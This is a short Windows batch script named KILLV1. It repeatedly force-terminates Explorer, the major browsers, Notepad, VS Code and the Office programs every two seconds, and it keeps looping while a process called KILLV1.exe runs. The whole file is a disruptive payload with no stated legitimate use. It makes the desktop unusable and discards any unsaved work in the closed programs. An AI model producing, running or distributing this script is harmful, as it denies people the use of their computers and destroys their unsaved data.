@echo off
title KILLV1

:1
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe
taskkill /f /im firefox.exe
taskkill /f /im msedge.exe
taskkill /f /im notepad.exe
taskkill /f /im code.exe
taskkill /f /im EXCEL.exe
taskkill /f /im POWERPNT.exe
taskkill /f /im WINWORD.exe
timeout /T 2 /nobreak

tasklist /fi "ImageName eq KILLV1.exe" /fo csv 2>NUL | find /I "KILLV1.exe">NUL
if "%ERRORLEVEL%"=="0" goto :1
exit